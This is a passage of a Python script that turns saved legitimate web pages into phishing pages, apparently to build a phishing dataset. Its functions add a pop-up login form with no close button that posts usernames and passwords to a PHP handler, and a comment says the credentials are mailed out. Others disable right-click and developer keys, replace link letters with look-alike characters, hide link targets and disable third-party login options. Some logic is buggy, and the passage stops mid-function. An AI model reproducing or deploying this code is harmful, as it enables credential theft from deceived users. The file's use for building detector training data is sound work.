import os
import random
import time

import requests
from bs4 import BeautifulSoup
import urllib.request
import webbrowser
import copy
import re
from urllib.parse import urlparse
import urllib

'''
Path to store legitimate and phishing web pages
'''
write_file = "Phishing Web Page Folder Path"
legitimate_sites_folder = "Legitimate Web Page Folder Path"

'''
=======================================    PHASE 3 (FUNCTION 1) BEGINS HERE  =======================================
In this function, we create an anchor tag with empty content
<a href="#">
<a href="#content">
<a href="#skip">
<a href="javascript::void(0)">
'''


def function_1(target_file, obtained_soup_here):
    print("Adding feature <a href=\"#\">")
    write_file_name = os.path.join(write_file, str(target_file) + ".html")

    f1_soup = obtained_soup_here
    for el in f1_soup.find_all("a"):
        href_choice = ['#', '#content', '#skip', 'Javascript:void(0)']
        el["href"] = random.choice(href_choice)
        el["onclick"] = ""

    function_1_soup = copy.deepcopy(f1_soup.prettify())

    with open(write_file_name, 'w', encoding='utf-8') as f_1_output:
        f_1_output.write(str(function_1_soup))


'''
========================================    PHASE 3 (FUNCTION 1) ENDS HERE  ========================================
'''

'''
=======================================    PHASE 3 (FUNCTION 2) BEGINS HERE  =======================================
In this feature, we disable the right click and CTRL options from viewing any source code content

Add attribute 'oncontextmenu="return false;"' in the body tag to disable the right click of the webpage
If wanted we can add an alert message if right clicked using javascript
javascript_code_to_append_for_alert = \'''
<script type="text/javascript"> 
function no_right_click() 
{ 
alert("Right click is not allowed for this page"); 
return false; 
} 
</script> 
\'''
and in the tag body the attribute should be 'oncontextmenu="return no_right_click();"'
'''


def function_2(target_file):
    print("Adding feature 'Disabling Right Click, Fn key and CTRL key'")

    open_this = os.path.join(legitimate_sites_folder, str(target_file) + ".html")

    # Disabling right click
    with open(open_this, 'rb') as f_2_input:
        function_2_contents = f_2_input.read()
        f2_soup = BeautifulSoup(function_2_contents, 'lxml')

        body_tag = f2_soup.body
        body_tag['onkeypress'] = "return disableCtrlKeyCombination(event);"
        body_tag['onkeydown'] = "return disableCtrlKeyCombination(event);"

        disable_tag = f2_soup.new_tag('script')
        disable_tag['language'] = "JavaScript"
        disable_tag['type'] = "text/javascript"
        disable_tag.string = '''document.onkeypress = function (event) {
        event = (event || window.event);
        if (event.keyCode == 123) {
           //alert('No F-12');
            return false;
        }
    }
    document.onmousedown = function (event) {
        event = (event || window.event);
        if (event.keyCode == 123) {
            //alert('No F-keys');
            return false;
        }
    }
document.onkeydown = function (event) {
        event = (event || window.event);
        if (event.keyCode == 123) {
            //alert('No F-keys');
            return false;
        }
    }
function clickIE() {if (document.all) {return false;}}
function clickNS(e) {if
(document.layers||(document.getElementById&&!document.all)) {
if (e.which==2||e.which==3) {(message);return false;}}}
if (document.layers)
{document.captureEvents(Event.MOUSEDOWN);document.onmousedown=clickNS;}
else{document.onmouseup=clickNS;document.oncontextmenu=clickIE;}
document.oncontextmenu=new Function("return false")
//
function disableCtrlKeyCombination(e)
{
//list all CTRL + key combinations you want to disable
var forbiddenKeys = new Array('a', 'n', 'c', 'x', 'v', 'j' , 'w', 'u');
var key;
var isCtrl;
if(window.event)
{
key = window.event.keyCode;     //IE
if(window.event.ctrlKey)
isCtrl = true;
else
isCtrl = false;
}
else
{
key = e.which;     //firefox
if(e.ctrlKey)
isCtrl = true;
else
isCtrl = false;
}
//if ctrl is pressed check if other key is in forbidenKeys array
if(isCtrl)
{
for(i=0; i<forbiddenKeys.length; i++)
{
//case-insensitive comparation
if(forbiddenKeys[i].toLowerCase() == String.fromCharCode(key).toLowerCase())
{
<!--alert('Key combination CTRL + '+String.fromCharCode(key) +' has been disabled.');-->
return false;
}
}
}
return true;
}
        '''
        f2_soup.html.head.append(disable_tag)

    import copy

    function_2_soup = copy.deepcopy(f2_soup.prettify())

    write_file_name = os.path.join(write_file, str(target_file) + ".html")

    with open(write_file_name, 'w', encoding='utf-8') as f_2_output:
        f_2_output.write(str(function_2_soup))


'''
========================================    PHASE 3 (FUNCTION 2) ENDS HERE  ========================================
'''

'''
=======================================    PHASE 3 (FUNCTION 3) BEGINS HERE  =======================================
In this feature we add dummy comments
'''


def function_3(target_file, obtained_soup_here):
    print("Adding feature 'Comments'")
    write_file_name = os.path.join(write_file, str(target_file) + ".html")

    f3_soup = obtained_soup_here
    comment_strings = ['''<b><!-- This code is used to get credentials --></b>''',
                       '''<b><!-- The following code redirects to login page --></b>''',
                       '''<b><!-- Code for adding username and password --></b>''']
    for i in range(5):
        comment_line_addition = random.choice(comment_strings)
        f3_soup.html.body.append(BeautifulSoup(comment_line_addition, 'html.parser'))
        f3_soup.prettify()

    '''
    Copy the contents of the downloaded html file soup to another soup using 'copy.deepcopy()' method and create new html file
    '''
    import copy

    function_3_soup = copy.deepcopy(f3_soup.prettify())

    with open(write_file_name, 'w', encoding='utf-8') as f_3_output:
        f_3_output.write(str(function_3_soup))


'''
========================================    PHASE 3 (FUNCTION 3) ENDS HERE  ========================================
'''

'''
=======================================    PHASE 3 (FUNCTION 4) BEGINS HERE  =======================================
Add dummy div tags with visibility:hidden
'''


def function_4(target_file, obtained_soup_here):
    print("Adding feature 'Dummy div tags'")

    write_file_name = os.path.join(write_file, str(target_file) + ".html")

    f4_soup = obtained_soup_here

    for i in range(0, 10):
        additional_div_tags = f4_soup.new_tag("div")
        additional_div_tags.string = "Here is the dummy text " + str(i) + " added in the body of the html file"
        if additional_div_tags.has_attr('style'):
            div_styles_present = additional_div_tags['style']
            div_additional_styling = div_styles_present + "visibility: hidden;"
            additional_div_tags['style'] = div_additional_styling
        else:
            additional_div_tags['style'] = "visibility: hidden;"

        f4_soup.html.body.append(additional_div_tags)

    '''
    Copy the contents to the file from the updates made from the soup to add dummy div tags
    '''
    import copy

    function_4_soup = copy.deepcopy(f4_soup.prettify())

    with open(write_file_name, 'w', encoding='utf-8') as f_4_output:
        f_4_output.write(str(function_4_soup))


'''
========================================    PHASE 3 (FUNCTION 4) ENDS HERE  ========================================
'''

'''
=======================================    PHASE 3 (FUNCTION 5) BEGINS HERE  =======================================
Add dummy script tags in head and body tag
'''


def function_5(target_file, obtained_soup_here):
    print("Adding feature 'Dummy script tags'")

    write_file_name = os.path.join(write_file, str(target_file) + ".html")

    f5_soup = obtained_soup_here
    script_tags_src = ["myScripts.js", "Scripts.js", "scripts.js", "Scripts/script.js", "scriptFolder/script.js"]

    for i in range(0, 5):
        additional_script_tags = f5_soup.new_tag("script")
        additional_script_tags['type'] = "text/javascript"
        additional_script_tags['src'] = random.choice(script_tags_src)
        f5_soup.html.head.append(additional_script_tags)

    for i in range(0, 5):
        additional_script_tags = f5_soup.new_tag("script")
        additional_script_tags['type'] = "text/javascript"
        additional_script_tags['src'] = random.choice(script_tags_src)
        f5_soup.html.body.append(additional_script_tags)

    '''
    Copy the contents to the file from the updates made from the soup to add dummy script tags
    '''
    import copy

    function_5_soup = copy.deepcopy(f5_soup.prettify())

    with open(write_file_name, 'w', encoding='utf-8') as f_5_output:
        f_5_output.write(str(function_5_soup))


'''
========================================    PHASE 3 (FUNCTION 5) ENDS HERE  ========================================
'''

'''
=======================================    PHASE 3 (FUNCTION 6) BEGINS HERE  =======================================
Add dummy link tags in head tag
'''


def function_6(target_file, obtained_soup_here):
    print("Adding feature 'Dummy link tags'")

    write_file_name = os.path.join(write_file, str(target_file) + ".html")

    f6_soup = obtained_soup_here
    styling_directory = ["style.css", "Styles/styling.css", "styleFolder/styleCSS.css"]

    for i in range(0, 5):
        additional_link_tag = f6_soup.new_tag("link")
        additional_link_tag['rel'] = "stylesheet"
        additional_link_tag['type'] = "text/css"
        additional_link_tag['href'] = random.choice(styling_directory)
        if additional_link_tag.has_attr('style'):
            link_styles_present = additional_link_tag['style']
            link_additional_styling = link_styles_present + "display: none;"
            additional_link_tag['style'] = link_additional_styling
        else:
            additional_link_tag['style'] = "display: none;"
        f6_soup.html.head.append(additional_link_tag)

    '''
    Copy the contents to the file from the updates made from the soup to add dummy link tags
    '''
    import copy

    function_6_soup = copy.deepcopy(f6_soup.prettify())

    with open(write_file_name, 'w', encoding='utf-8') as f_6_output:
        f_6_output.write(str(function_6_soup))


'''
========================================    PHASE 3 (FUNCTION 6) ENDS HERE  ========================================
'''

'''
=======================================    PHASE 3 (FUNCTION 7) BEGINS HERE  =======================================
In this feature we add opacity to the body tag to make it blur
'''


def function_7(target_file, obtained_soup_here):
    print("Adding feature 'Body opacity'")

    write_file_name = os.path.join(write_file, str(target_file) + ".html")

    f7_soup = obtained_soup_here
    if f7_soup.html.body.has_attr('style'):
        body_styles_present = f7_soup.html.body['style']
        body_additional_styling = body_styles_present + "opacity: 0.8;"
        f7_soup.html.body['style'] = body_additional_styling
    else:
        f7_soup.html.body['style'] = "opacity:0.7;"

    '''
    Copy the contents of the downloaded html file soup to another soup using 'copy.deepcopy()' method and create new html file
    '''
    import copy

    function_7_soup = copy.deepcopy(f7_soup.prettify())

    with open(write_file_name, 'w', encoding='utf-8') as f_7_output:
        f_7_output.write(str(function_7_soup))


'''
========================================    PHASE 3 (FUNCTION 7) ENDS HERE  ========================================
'''

'''
=======================================    PHASE 3 (FUNCTION 8) BEGINS HERE  =======================================
In this feature we pop-up the login form with out cross mark on the form to ensure the credentials are entered by the target
Then, the inputs are saved in a .txt file to mail credentials using send_mail_inputs.py
'''


def function_8(target_file, obtained_soup_here):
    write_file_name = os.path.join(write_file, str(target_file) + ".html")

    f8_soup = obtained_soup_here

    if f8_soup.find('form'):
        print("Adding feature 'Pop-up Login'")
        for form_element in f8_soup.find_all("form"):
            form_element["action"] = ""

        [input_tag.extract() for input_tag in f8_soup.findAll('input')]
        [label_tag.clear() for label_tag in f8_soup.findAll('label')]

        for button_change in f8_soup.find_all('button'):
            button_change['class'] = "_button"
            button_change['href'] = "#"
            button_change['onclick'] = "show('popup')"

        pop_up_div_tag_add_string = '''<div class="popup" id="popup">
                                            <div class="center">
                                                <div class="container">
                                                    <div class="text">Login Form</div>
                                                    <form action="get_form_inputs.php" method="post">
                                                        <div class="data"><label>Email or Phone</label>
                                                            <input type="text" name="user_name" required>
                                                        </div>
                                                        <div class="data"><label>Password</label>
                                                            <input type="password" name="user_password" required>
                                                        </div>
                                                        <div class="forgot-pass"><a href="#">Forgot Password?</a></div>
                                                        <div class="btn">
                                                            <div class="inner"></div>
                                                            <button type="submit" name="submit" onclick="handler(onkeydown)">Login</button>
                                                        </div>
                                                        <div class="signup-link">Not a member? <a href="#">Signup now</a></div>
                                                    </form>
                                                </div>
                                            </div>
                                        </div>'''
        f8_soup.html.body.append(BeautifulSoup(pop_up_div_tag_add_string, 'html.parser'))
        f8_soup.prettify()

        script_tag_for_pop_up = f8_soup.new_tag("script")
        script_tag_for_pop_up.string = '''$ = function(id) {return document.getElementById(id);}
        var show = function(id){$(id).style.display ='block';}
        var hide = function(id) {	$(id).style.display ='none';}'''
        f8_soup.html.body.append(script_tag_for_pop_up)

        style_tag_for_pop_up = f8_soup.new_tag("style")
        style_tag_for_pop_up.string = '''.container{position: absolute;top: 50%;left: 50%;transform: translate(-50%, -50%);}
                                        input[type="checkbox"]{display: none;}
                                        .container{background: #fff;width: 410px;padding: 30px;box-shadow: 0 0 8px rgba(0,0,0,0.1);}
                                        .container .text{font-size: 35px;font-weight: 600;text-align: center;}
                                        .container form{margin-top: -20px;}
                                        .container form .data{height: 45px;width: 100%;margin: 40px 0;}
                                        form .data label{font-size: 18px;}
                                        form .data input{height: 100%;width: 100%;padding-left: 10px;font-size: 17px;border: 1px solid silver;}
                                        form .data input:focus{border-color: #3498db;border-bottom-width: 2px;}
                                        form .forgot-pass{margin-top: -8px;}
                                        form .forgot-pass a{color: #3498db;text-decoration: none;}
                                        form .forgot-pass a:hover{text-decoration: underline;}
                                        form .btn{margin: 30px 0;height: 45px;width: 100%;position: relative;overflow: hidden;}
                                        form .btn .inner{height: 100%;width: 300%;position: absolute;left: -100%;z-index: -1;background: -webkit-linear-gradient(right, #512122, #31ac15, #255a21, #3020a0);transition: all 0.4s;}
                                        form .btn:hover .inner{left: 0;}
                                        form .btn button{height: 100%;width: 100%;background: none;border: none;color: #fff;font-size: 18px;font-weight: 500;text-transform: uppercase;letter-spacing: 1px;cursor: pointer;}
                                        form .signup-link{text-align: center;}
                                        form .signup-link a{color: #3498db;text-decoration: none;}
                                        form .signup-link a:hover{text-decoration: underline;}
                                        .popup {display: none;position: fixed;padding: 10px;width: 500px;left: 40%;margin-left: -100px;height: 500px;top: 20%;margin-top: -100px;background: #FFF;border: 3px solid #4e4a4a;z-index: 20;}
                                        #popup:after {position: fixed;content: "";top: 0;left: 0;bottom: 0;right: 0;background: rgba(0,0,0,0.5);z-index: -2;}
                                        #popup:before {position: absolute;content: "";top: 0;left: 0;bottom: 0;right: 0;background: #FFF;z-index: -1;}
                                        /* Styling buttons & webpage */
                                        ._button {margin-top: 50px;background-color: rgba(255,255,255,0.3);border: 3px solid #595757;color: #4a4545;font-size: 25px;padding: 10px 20px;}
                                        ._button:hover {background-color: #563e3e;color: #FFF;border: 3px solid #9a7373;transition: all 0.3s ease 0s;}
                                        p {margin: 1em 0;font-size: 16px;}
                                        .popupk {display: none;position: fixed;padding: 10px;width: 500px;left: 50%;margin-left: -150px;height: 500px;top: 50%;margin-top: -100px;background: #FFF;border: 3px solid #876565;z-index: 20;}
                                        #popupk:after {position: fixed;content: "";top: 0;left: 0;bottom: 0;right: 0;background: rgba(0,0,0,0.5);z-index: -2;}
                                        #popupk:before {position: absolute;content: "";top: 0;left: 0;bottom: 0;right: 0;background: #FFF;z-index: -1;}
                                        /* Styling buttons & webpage */
                                        body {background: offwhite;font-family: Arial, sans-serif;text-align: center;}
                                        ._button {margin-top: 10px;background-color: rgba(255,255,255,0.3);border: 1.5px solid #534242;color: #3e3939;font-size: 15px;padding: 5px 10px;}
                                        ._button:hover {background-color: #473f3f;color: #FFF;border: 3px solid #6a5b5b;transition: all 0.3s ease 0s;}
                                        p {margin: 1em 0;font-size: 16px;}'''
        f8_soup.html.head.append(style_tag_for_pop_up)

    '''
    Copy the contents of the downloaded html file soup to another soup using 'copy.deepcopy()' method and create new html file
    '''
    import copy

    function_8_soup = copy.deepcopy(f8_soup.prettify())

    with open(write_file_name, 'w', encoding='utf-8') as f_8_output:
        f_8_output.write(str(function_8_soup))


'''
========================================    PHASE 3 (FUNCTION 8) ENDS HERE  ========================================
'''

'''
=======================================    PHASE 3 (FUNCTION 9) BEGINS HERE  =======================================
In this feature we add dummy images with visibility:hidden or display:none
'''


def function_9(target_file, obtained_soup_here):
    print("Adding feature 'Dummy image with no display'")

    write_file_name = os.path.join(write_file, str(target_file) + ".html")

    f9_soup = obtained_soup_here

    for i in range(0, 5):
        image_tag = f9_soup.new_tag('img')
        image_tag['src'] = "dummy_image.png"
        image_tag['alt'] = ""
        if image_tag.has_attr('style'):
            image_styles_present = image_tag['style']
            if "display:none;" not in image_styles_present:
                image_additional_styling = image_styles_present + "display:none;"
                image_tag['style'] = image_additional_styling
        else:
            image_tag['style'] = "display:none;"
        f9_soup.html.body.append(image_tag)

    '''
    Copy the contents of the downloaded html file soup to another soup using 'copy.deepcopy()' method and create new html file
    '''
    import copy

    function_9_soup = copy.deepcopy(f9_soup.prettify())

    with open(write_file_name, 'w', encoding='utf-8') as f_9_output:
        f_9_output.write(str(function_9_soup))


'''
========================================    PHASE 3 (FUNCTION 9) ENDS HERE  ========================================
'''

'''
=======================================    PHASE 3 (FUNCTION 10) BEGINS HERE  =======================================
In this feature we add a set of dummy anchor tags and few redirect to the same web page and others are disabled
'''


def function_10(target_file, obtained_soup_here):
    print("Adding feature 'Dummy anchor tags with few of redirecting and few disabled'")
    write_file_name = os.path.join(write_file, str(target_file) + ".html")

    f10_soup = obtained_soup_here

    # Find all the anchor tags in the HTML
    anchors = f10_soup.find_all("a")

    for i, anchor in enumerate(anchors):
        # Create a new anchor tag with the desired attributes
        new_anchor = f10_soup.new_tag("a", href="#")
        new_anchor.string = random.choice(
            ['Find Us', 'Enter Credentials', 'Login for more', 'Reach Us', 'Contact Us', 'Mail Us',
             'Login To Know More'])
        new_anchor['style'] = "text-decoration:none;"
        new_anchor['style'] = "text-decoration:none;"
        # Insert the new anchor tag after the current anchor tag
        anchor.insert_after(new_anchor)

    pop_up_div_tag_add_string = '''<div class="popup" id="popup">
                                                    <div class="center">
                                                        <div class="container">
                                                            <div class="text">Login Form</div>
                                                            <form action="get_form_inputs.php" method="post">
                                                                <div class="data"><label>Email or Phone</label>
                                                                    <input type="text" name="user_name" required>
                                                                </div>
                                                                <div class="data"><label>Password</label>
                                                                    <input type="password" name="user_password" required>
                                                                </div>
                                                                <div class="forgot-pass"><a href="#">Forgot Password?</a></div>
                                                                <div class="btn">
                                                                    <div class="inner"></div>
                                                                    <button type="submit" name="submit" onclick="handler(onkeydown)">Login</button>
                                                                </div>
                                                                <div class="signup-link">Not a member? <a href="#">Signup now</a></div>
                                                            </form>
                                                        </div>
                                                    </div>
                                                </div>'''
    f10_soup.html.body.append(BeautifulSoup(pop_up_div_tag_add_string, 'html.parser'))
    f10_soup.prettify()

    script_tag_for_pop_up = f10_soup.new_tag("script")
    script_tag_for_pop_up.string = '''$ = function(id) {return document.getElementById(id);}
                var show = function(id){$(id).style.display ='block';}
                var hide = function(id) {	$(id).style.display ='none';}'''
    f10_soup.html.body.append(script_tag_for_pop_up)

    style_tag_for_pop_up = f10_soup.new_tag("style")
    style_tag_for_pop_up.string = '''.container{position: absolute;top: 50%;left: 50%;transform: translate(-50%, -50%);}
                                                input[type="checkbox"]{display: none;}
                                                .container{background: #fff;width: 410px;padding: 30px;box-shadow: 0 0 8px rgba(0,0,0,0.1);}
                                                .container .text{font-size: 35px;font-weight: 600;text-align: center;}
                                                .container form{margin-top: -20px;}
                                                .container form .data{height: 45px;width: 100%;margin: 40px 0;}
                                                form .data label{font-size: 18px;}
                                                form .data input{height: 100%;width: 100%;padding-left: 10px;font-size: 17px;border: 1px solid silver;}
                                                form .data input:focus{border-color: #3498db;border-bottom-width: 2px;}
                                                form .forgot-pass{margin-top: -8px;}
                                                form .forgot-pass a{color: #3498db;text-decoration: none;}
                                                form .forgot-pass a:hover{text-decoration: underline;}
                                                form .btn{margin: 30px 0;height: 45px;width: 100%;position: relative;overflow: hidden;}
                                                form .btn .inner{height: 100%;width: 300%;position: absolute;left: -100%;z-index: -1;background: -webkit-linear-gradient(right, #512122, #31ac15, #255a21, #3020a0);transition: all 0.4s;}
                                                form .btn:hover .inner{left: 0;}
                                                form .btn button{height: 100%;width: 100%;background: none;border: none;color: #fff;font-size: 18px;font-weight: 500;text-transform: uppercase;letter-spacing: 1px;cursor: pointer;}
                                                form .signup-link{text-align: center;}
                                                form .signup-link a{color: #3498db;text-decoration: none;}
                                                form .signup-link a:hover{text-decoration: underline;}
                                                .popup {display: none;position: fixed;padding: 10px;width: 500px;left: 40%;margin-left: -100px;height: 500px;top: 20%;margin-top: -100px;background: #FFF;border: 3px solid #4e4a4a;z-index: 20;}
                                                #popup:after {position: fixed;content: "";top: 0;left: 0;bottom: 0;right: 0;background: rgba(0,0,0,0.5);z-index: -2;}
                                                #popup:before {position: absolute;content: "";top: 0;left: 0;bottom: 0;right: 0;background: #FFF;z-index: -1;}
                                                /* Styling buttons & webpage */
                                                ._button {margin-top: 50px;background-color: rgba(255,255,255,0.3);border: 3px solid #595757;color: #4a4545;font-size: 25px;padding: 10px 20px;}
                                                ._button:hover {background-color: #563e3e;color: #FFF;border: 3px solid #9a7373;transition: all 0.3s ease 0s;}
                                                p {margin: 1em 0;font-size: 16px;}
                                                .popupk {display: none;position: fixed;padding: 10px;width: 500px;left: 50%;margin-left: -150px;height: 500px;top: 50%;margin-top: -100px;background: #FFF;border: 3px solid #876565;z-index: 20;}
                                                #popupk:after {position: fixed;content: "";top: 0;left: 0;bottom: 0;right: 0;background: rgba(0,0,0,0.5);z-index: -2;}
                                                #popupk:before {position: absolute;content: "";top: 0;left: 0;bottom: 0;right: 0;background: #FFF;z-index: -1;}
                                                /* Styling buttons & webpage */
                                                body {background: offwhite;font-family: Arial, sans-serif;text-align: center;}
                                                ._button {margin-top: 10px;background-color: rgba(255,255,255,0.3);border: 1.5px solid #534242;color: #3e3939;font-size: 15px;padding: 5px 10px;}
                                                ._button:hover {background-color: #473f3f;color: #FFF;border: 3px solid #6a5b5b;transition: all 0.3s ease 0s;}
                                                p {margin: 1em 0;font-size: 16px;}'''
    f10_soup.html.head.append(style_tag_for_pop_up)

    '''
    Copy the contents of the downloaded html file soup to another soup using 'copy.deepcopy()' method and create new html file
    '''
    import copy

    function_10_soup = copy.deepcopy(f10_soup.prettify())

    with open(write_file_name, 'w', encoding='utf-8') as f_10_output:
        f_10_output.write(str(function_10_soup))


'''
========================================    PHASE 3 (FUNCTION 10) ENDS HERE  ========================================
'''

'''
=======================================    PHASE 3 (FUNCTION 11) BEGINS HERE  =======================================
In this feature we disable other login buttons if present for login
'''


def function_11(target_file, obtained_soup_here):
    print("Add feature 'Disable other login buttons'")
    write_file_name = os.path.join(write_file, str(target_file) + ".html")

    f11_soup = obtained_soup_here
    github_link = f11_soup.find("form", action="https://github.com/login")
    google_link = f11_soup.find("form", action="https://accounts.google.com/login")

    if github_link:
        remove_github_href = f11_soup.find("form", action="https://github.com/login")
        remove_github_href['href'] = "#"
    if google_link:
        remove_google_href = f11_soup.find("form", action="https://accounts.google.com/login")
        remove_google_href['href'] = "#"

    '''
    Copy the contents of the downloaded html file soup to another soup using 'copy.deepcopy()' method and create new html file
    '''
    import copy

    function_11_soup = copy.deepcopy(f11_soup.prettify())

    with open(write_file_name, 'w', encoding='utf-8') as f_11_output:
        f_11_output.write(str(function_11_soup))


'''
========================================    PHASE 3 (FUNCTION 11) ENDS HERE  ========================================
'''

'''
=======================================    PHASE 3 (FUNCTION 12) BEGINS HERE  =======================================
In this feature we find and replace the domain name with look alike characters
'''


def function_12(target_file, obtained_soup_here):
    print("Adding feature 'Look Alike characters'")
    write_file_name = os.path.join(write_file, str(target_file) + ".html")

    character_a = ['ä', 'ẚ', 'á', 'ầ', 'ā', 'ä']
    character_b = ['b̀', 'b̂', 'b̃', 'ḇ̂', 'b̤', 'b̥']
    character_c = ['c̀', 'ć', 'c̃', 'c̈', 'ċ', 'c̓']
    character_d = ['d̊', 'd́', 'ď', 'ḑ', 'đ', 'd̥']
    character_e = ['è', 'ê', 'ē', 'ė', 'ë', 'e̊']
    character_i = ['í', 'ǐ', 'i̎', 'ḭ', 'ị']
    character_o = ['ó', 'ò', 'ṓ', 'ö', 'o̍']

    look_alike_characters = {'a': random.choice(character_a),
                             'b': random.choice(character_b),
                             'c': random.choice(character_c),
                             'd': random.choice(character_d),
                             'e': random.choice(character_e),
                             'f': 'f̣', 'g': 'g̈', 'h': 'ḥ', 'i': random.choice(character_i),
                             'j': 'j́', 'k': 'k̥', 'l': 'l̩̓', 'm': 'm̍', 'n': 'ņ',
                             'o': random.choice(character_o), 'p': 'p̣', 'q': 'q̣', 'r': 'ṛ', 's': 'ś',
                             't': 'ṫ', 'u': 'u̇', 'v': 'v̓', 'w': 'ẉ', 'x': 'ẋ', 'y': 'ý', 'z': 'ẓ̣'}

    # with open(write_file_name, 'rb') as f_12_input:
    #     function_12_contents = f_12_input.read()
    #     f12_soup = BeautifulSoup(function_12_contents, 'html.parser')

    # for a in f12_soup.findAll('a'):
    #     href_value = str(a['href'])
    #     char_in_href = href_value[0]
    #     replaced_char = ''
    #     for key in look_alike_characters:
    #         if key == char_in_href:
    #             replaced_char += look_alike_characters[key]
    #
    #     new_href_name = href_value.replace(char_in_href, replaced_char)
    #     a['href'] = new_href_name

    f12_soup = obtained_soup_here
    # for anchor_tag in f12_soup.find_all('a', href=True):
    #     href_value = anchor_tag['href']
    #     alphanumeric_href_value = href_value.isalnum()
    #     if alphanumeric_href_value:
    #         char_to_replace = random.choice(href_value)
    #         replaced_char = ''
    #         for key in look_alike_characters:
    #             if key == char_to_replace:
    #                 replaced_char += look_alike_characters[key]
    #         new_href_value = replaced_char
    #         anchor_tag['href'] = new_href_value
    #     else:
    #         anchor_tag['href'] = href_value.replace('#', '##')

    for anchor_tag in f12_soup.find_all('a', href=True):
        href_value = anchor_tag['href']
        if '#' or 'Javascript' or 'javascript' in href_value:
            pass
        else:
            for href_value_char in href_value:
                if href_value_char in look_alike_characters:
                    href_value = href_value.replace(href_value_char, look_alike_characters[href_value_char])

        anchor_tag['href'] = href_value

    '''
    Copy the contents of the downloaded html file soup to another soup using 'copy.deepcopy()' method and create new html file
    '''

    import copy

    function_12_soup = copy.deepcopy(f12_soup.prettify())

    with open(write_file_name, 'w', encoding='utf-8') as f_12_output:
        f_12_output.write(str(function_12_soup))


'''
========================================    PHASE 3 (FUNCTION 12) ENDS HERE  ========================================
'''

'''
=======================================    PHASE 3 (FUNCTION 13) BEGINS HERE  =======================================
In this feature we hide the status bar address link in web browser
'''


def function_13(target_file, obtained_soup_here):
    print("Adding feature 'Hide status bar address link'")
    write_file_name = os.path.join(write_file, str(target_file) + ".html")

    f13_soup = obtained_soup_here

    for anchor_tag in f13_soup.find_all('a'):
        anchor_tag['class'] = "hidelink"

    hide_link_style_tag = f13_soup.new_tag('style')
    hide_link_style_tag.string = ".hidelink{cursor:pointer; text-decoration:underline;}"
    f13_soup.html.head.append(hide_link_style_tag)

    another_hiding_tag = f13_soup.new_tag('script')
    another_hiding_tag['src'] = "http://code.jquery.com/jquery-1.10.0.min.js"
    f13_soup.html.head.append(another_hiding_tag)

    hide_address_link_script_tag = f13_soup.new_tag('script')
    hide_address_link_script_tag.string = "$(function(){$(\"a.hidelink\").each(function (index, element){var href = " \
                                          "$(this).attr(\"href\");$(this).attr(\"hiddenhref\", " \
                                          "href);$(this).removeAttr(\"href\");});$(\"a.hidelink\").click(function(){" \
                                          "url = $(this).attr(\"hiddenhref\");window.open(url, '_blank');})}); "
    f13_soup.html.head.append(hide_address_link_script_tag)

    '''
    Copy the contents of the downloaded html file soup to another soup using 'copy.deepcopy()' method and create new html file
    '''
    import copy

    function_13_soup = copy.deepcopy(f13_soup.prettify())

    with open(write_file_name, 'w', encoding='utf-8') as f_13_output:
        f_13_output.write(str(function_13_soup))


'''
========================================    PHASE 3 (FUNCTION 13) ENDS HERE  ========================================
'''

'''
Visual Similarity-based Features
'''

'''
=======================================    PHASE 3 (FUNCTION 14) BEGINS HERE  =======================================
In this feature we change the font family of the text content in the html file
'''


def function_14(target_file, obtained_soup_here):
    print("Adding feature 'Font Family to text content'")
    write_file_name = os.path.join(write_file, str(target_file) + ".html")

    f14_soup = obtained_soup_here

    body_tag = f14_soup.find('body')
    if body_tag.has_attr('style'):
        body_tag_present_style = body_tag['style']
        body_tag_additional_styling = body_tag_present_style + "width: 100%;"
        body_tag['style'] = body_tag_additional_styling
    else:
        body_tag['style'] = "width: 100%;"

    for font_tag in f14_soup.find_all('a'):
        if font_tag.has_attr('style'):
            font_family_styles_present = font_tag['style']
            font_family_additional_styling = font_family_styles_present + "font-family:serif; font-style:italic; text-decoration:none;"
            font_tag['style'] = font_family_additional_styling
        else:
            font_tag['style'] = "font-family:serif; font-style:italic; text-decoration:none;"

    '''
    Copy the contents of the downloaded html file soup to another soup using 'copy.deepcopy()' method and create new html file
    '''
    import copy

    function_14_soup = copy.deepcopy(f14_soup.prettify())

    with open(write_file_name, 'w', encoding='utf-8') as f_14_output:
        f_14_output.write(str(function_14_soup))


'''
========================================    PHASE 3 (FUNCTION 14) ENDS HERE  ========================================
'''

'''
=======================================    PHASE 3 (FUNCTION 15) BEGINS HERE  =======================================
In this feature we change the border styling in the html file
'''


def function_15(target_file, obtained_soup_here):
    print("Adding feature 'Border Styling'")
    write_file_name = os.path.join(write_file, str(target_file) + ".html")

    f15_soup = obtained_soup_here
    body_tag = f15_soup.find('body')
    if body_tag.has_attr('style'):
        body_tag_present_style = body_tag['style']
        body_tag_additional_styling = body_tag_present_style + "width: 100%;"
        body_tag['style'] = body_tag_additional_styling
    else:
        body_tag['style'] = "width: 100%;"

    for div_tag in f15_soup.find_all('div'):
        if div_tag.has_attr('style'):
            div_tag_styles_present = div_tag['style']
            div_tag_additional_styling = div_tag_styles_present + "border-width: 2px; border-color: grey;"
            div_tag['style'] = div_tag_additional_styling
        else:
            div_tag['style'] = "border-width: 2px; border-color: grey;"

    '''
    Copy the contents of the downloaded html file soup to another soup using 'copy.deepcopy()' method and create new html file
    '''
    import copy

    function_15_soup = copy.deepcopy(f15_soup.prettify())

    with open(write_file_name, 'w', encoding='utf-8') as f_15_output:
        f_15_output.write(str(function_15_soup))


'''
========================================    PHASE 3 (FUNCTION 15) ENDS HERE  ========================================
'''

'''
=======================================    PHASE 3 (FUNCTION 16) BEGINS HERE  =======================================
In this feature we change the text styling like: align center, capitalize, shadow, ... in the html file
'''


def function_16(target_file, obtained_soup_here):
    print("Adding feature 'Text Styling'")
    write_file_name = os.path.join(write_file, str(target_file) + ".html")

    f16_soup = obtained_soup_here
    body_tag = f16_soup.find('body')
    if body_tag.has_attr('style'):
        body_tag_present_style = body_tag['style']
        body_tag_additional_styling = body_tag_present_style + "width: 100%;"
        body_tag['style'] = body_tag_additional_styling
    else:
        body_tag['style'] = "width: 100%;"

    for text_tag in f16_soup.find_all('h2' or 'p' or 'h1'):
        if text_tag.has_attr('style'):
            text_tag_present_style = text_tag['style']
            text_tag_additional_styling = text_tag_present_style + "text-align: center; color: #4A667E; text-transform: capitalize; text-shadow: 1px 1px grey;"
            text_tag['style'] = text_tag_additional_styling
        else:
            text_tag[
                'style'] = "text-align: center; color: #4A667E; text-transform: capitalize; text-shadow: 1px 1px grey;"

    '''
    Copy the contents of the downloaded html file soup to another soup using 'copy.deepcopy()' method and create new html file
    '''
    import copy

    function_16_soup = copy.deepcopy(f16_soup.prettify())

